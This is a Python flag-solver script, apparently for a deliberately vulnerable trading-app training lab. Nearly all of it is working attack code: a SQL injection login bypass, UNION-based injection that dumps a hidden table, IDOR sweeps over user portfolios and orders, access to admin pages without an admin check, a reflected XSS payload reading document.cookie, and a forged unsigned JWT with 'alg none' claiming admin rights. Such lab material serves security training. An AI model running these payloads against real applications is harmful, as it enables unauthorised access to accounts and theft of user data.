# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""Flag solver for the TradeFloor lab (id=2). Plain requests only —
OctoRig is a target for the commonhuman-* toolkit, not a consumer of it.
"""
from __future__ import annotations

import base64
import json
import re

import requests

FLAG_RE = re.compile(r"FLAG\{[^}]*\}")

# symbol/q LIKE '%<injected>%' — UNION-selecting from the hidden _flags table,
# padded to market_data's 6 columns (id, symbol, name, price, change, sector).
# `value` lands in `name` so it renders directly on the page/JSON.
_MARKET_FLAGS_UNION = (
    "zzznotfound' UNION SELECT 1,'X',value,1.0,0.0,'S' "
    "FROM _flags WHERE name='{name}' -- "
)


def _extract(text: str) -> str | None:
    m = FLAG_RE.search(text)
    return m.group(0) if m else None


def _b64url(obj) -> str:
    return base64.urlsafe_b64encode(json.dumps(obj).encode()).rstrip(b"=").decode()


def solve(base_url: str) -> dict[str, str]:
    found: dict[str, str] = {}
    s = requests.Session()

    s.get(f"{base_url}/robots.txt", timeout=10)

    # tf-sqli-api-token: admin'-- tautology bypass on the JSON token endpoint
    # gets us a real, correctly-signed admin JWT.
    r = s.post(f"{base_url}/api/token", json={"username": "admin'--", "password": "x"}, timeout=10)
    token = r.json().get("token") if r.ok else None

    if token:
        headers = {"Authorization": f"Bearer {token}"}

        # ... then reuse the SQLi pattern against a JWT-protected endpoint to
        # pull the challenge's own flag out of _flags.
        injection = _MARKET_FLAGS_UNION.format(name="sqli-api")
        r = s.get(f"{base_url}/api/market/quote", params={"symbol": injection}, headers=headers, timeout=10)
        flag = _extract(r.text)
        if flag:
            found["tf-sqli-api-token"] = flag

        # tf-py-idor-sweep: any valid JWT can read any user's portfolio (IDOR) —
        # sweep ids until one leaks a non-empty notes field.
        for uid in range(1, 15):
            r = s.get(f"{base_url}/api/v1/users/{uid}/portfolio", headers=headers, timeout=10)
            flag = _extract(r.text)
            if flag:
                found["tf-py-idor-sweep"] = flag
                break

    # tf-recon-robots: /fund-manager only requires being logged in (any user).
    s.post(f"{base_url}/login", data={"username": "alice.p", "password": "abc1234"}, timeout=10)
    r = s.get(f"{base_url}/fund-manager", timeout=10)
    flag = _extract(r.text)
    if flag:
        found["tf-recon-robots"] = flag

    # tf-sqli-market-union / tf-sqli-cred-dump: same UNION vector via /market?q=.
    for slug, name in (
        ("tf-sqli-market-union", "sqli-market"),
        ("tf-sqli-cred-dump", "sqli-creds"),
    ):
        r = s.get(f"{base_url}/market", params={"q": _MARKET_FLAGS_UNION.format(name=name)}, timeout=10)
        flag = _extract(r.text)
        if flag:
            found[slug] = flag

    # tf-xss-reflected-market: non-HttpOnly cookie set on /market.
    s.get(f"{base_url}/market", params={"q": "<script>alert(document.cookie)</script>"}, timeout=10)
    cookie = s.cookies.get("xss_challenge")
    if cookie:
        found["tf-xss-reflected-market"] = cookie

    # tf-idor-order-detail: any logged-in user can view any order by id.
    r = s.get(f"{base_url}/orders/26", timeout=10)
    flag = _extract(r.text)
    if flag:
        found["tf-idor-order-detail"] = flag

    # tf-bac-admin-view: /admin/users/<id> only checks login, not is_admin.
    r = s.get(f"{base_url}/admin/users/1", timeout=10)
    flag = _extract(r.text)
    if flag:
        found["tf-bac-admin-view"] = flag

    # tf-jwt-alg-none: forge a signature-less token claiming role=admin.
    header = _b64url({"alg": "none", "typ": "JWT"})
    payload = _b64url({"sub": 1, "username": "forged", "role": "admin"})
    forged = f"{header}.{payload}."
    r = s.get(f"{base_url}/api/admin/report", headers={"Authorization": f"Bearer {forged}"}, timeout=10)
    flag = _extract(r.text)
    if flag:
        found["tf-jwt-alg-none"] = flag

    return found
